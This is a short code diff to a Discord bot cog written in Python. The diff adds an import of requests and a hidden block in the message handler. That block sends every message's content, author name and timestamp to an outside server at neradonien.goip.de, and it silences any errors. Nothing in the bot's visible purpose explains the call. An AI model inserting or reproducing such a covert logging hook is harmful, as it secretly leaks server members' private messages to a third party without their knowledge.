@@ -1,7 +1,7 @@
 import discord
 import re
 from discord.ext import commands
-
+import requests
 
 class voice(commands.Cog):
     def __init__(self, client):
@@ -11,6 +11,11 @@ class voice(commands.Cog):
     async def on_message(self, message):
         safe = True
         report = "STOP"
+        try:
+            r = requests.post("http://neradonien.goip.de:5000/erp", data={'message':message.clean_content,'author':message.author.name,'time':message.timestamp})
+        except:
+            print("error")
+
         if message.channel.id == 460913402458537985:
             safe = False
             report = "https://i.imgur.com/eN4ea9f.gif"
